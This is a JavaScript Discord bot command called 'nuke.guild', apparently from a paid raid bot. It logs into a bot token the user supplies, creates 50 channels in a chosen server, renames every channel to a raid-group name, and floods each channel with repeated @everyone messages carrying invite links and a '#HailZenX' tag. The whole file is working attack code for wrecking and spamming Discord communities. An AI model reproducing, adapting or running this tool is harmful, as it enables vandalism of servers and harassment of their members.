const { Client, ButtonBuilder, ButtonStyle, ActionRowBuilder, ComponentType } = require('discord.js');
const fs = require('fs');
const fetch = require("node-fetch");

async function wait_ms(ms) { return new Promise(resolve => setTimeout(resolve, ms)); };

module.exports = {
    name: 'nuke.guild',
    description: 'Nukes a guild.',
    prefix: '#',
    premium: true,
    async execute(msg, client, channel_logs, blacklist_user, idservidores_nopermitidos, config_usuarios_premium) {
        try {
            const blacklist_pecausa = new ButtonBuilder()
                .setCustomId('xdxd')
                .setLabel('Blacklist User')
                .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
                .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({ components: [equisde], content: `Command **nuke.guild** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})` });
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int) => {
                if (int.customId === "xdxd") {
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]", "");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json', asd);
                    int.reply({ content: `> Usuario en blacklist.` });
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        };
        if (idservidores_nopermitidos.includes(config_usuarios_premium[msg.author.id].guild_id)) {
            await msg.channel.send({ content: `> Ese servidor no está permitido.` });
            return;
        };
        if (!config_usuarios_premium[msg.author.id].guild_id) {
            await msg.channel.send({ content: `> No haz introducido ninguna ID de un servidor por lo tanto no se puede nukear.` });
            return;
        } else {
            if (!config_usuarios_premium[msg.author.id].bot_token_n) {
                await msg.channel.send({ content: `> No haz introducido ningún token de bot.` });
                return;
            } else {
                config_usuarios_premium[msg.author.id].invite_url == "" ? "https://discord.gg/zCQ8jQ2GBf" : config_usuarios_premium[msg.author.id].invite_url;
                await msg.channel.send({ content: `> Nukeando guild...` });
                let namev = `client${msg.author.id}`;
                namev = new Client({ intents: [103423] });
                await namev.login(config_usuarios_premium[msg.author.id].bot_token_n);
                let chsisssss = 0;
                let counterrrrr = 0;
                async function enviar_msgxd(canal) {
                    let canalxdxd = namev.channels.cache.get(canal.id);
                    for (let index = 0; index < 30; index++) {
                        try {
                            await canalxdxd.send({ content: `@everyone ${config_usuarios_premium[msg.author.id].invite_url} https://discord.gg/zCQ8jQ2GBf - | - https://www.youtube.com/watch?v=xKY-d0QkKjE / #HailZenX` });
                            counterrrrr++;
                            if (chsisssss <= counterrrrr) {
                                await namev.destroy();
                            };
                        } catch (e) {
                            console.log(`[X] No se pudo enviar un mensaje con el comando "nuke.guild", mensaje de error: ${e.message}`);
                        }
                    };
                };
                let canales_xdxd = [];
                async function crear_canalesxdxd() {
                    const res = await fetch(`https://discord.com/api/v9/guilds/${config_usuarios_premium[msg.author.id].guild_id}/channels`, {
                        method: 'POST',
                        headers: {
                            "Authorization": `Bot ${config_usuarios_premium[msg.author.id].bot_token_n}`,
                            "content-type": "application/json"
                        },
                        body: JSON.stringify({
                            "name": "test",
                            "type": "0"
                        })
                    });
                    const jsonxdxd = await res.json();
                    canales_xdxd.push(jsonxdxd['id']);
                    if (canales_xdxd.length >= 50) {
                        let channelss = await namev.guilds.cache.get(config_usuarios_premium[msg.author.id].guild_id).channels.fetch();
                        chsisssss = channelss.size * 30;
                        for (const ch of channelss.values()) {
                            try {
                                ch.setName('ʀǟɨɖɮʏռɨӽǟʝǟɮǟʐɨֆ');
                            } catch (e) {
                                console.log(e);
                            };
                        };
                        for (const ch of channelss.values()) {
                            try {
                                enviar_msgxd(ch);
                            } catch (e) {
                                console.log(e);
                            };
                        };
                    };
                };
                for (let index = 0; index < 50; index++) {
                    await wait_ms(10);
                    crear_canalesxdxd();
                };
            }
        };
    }
};
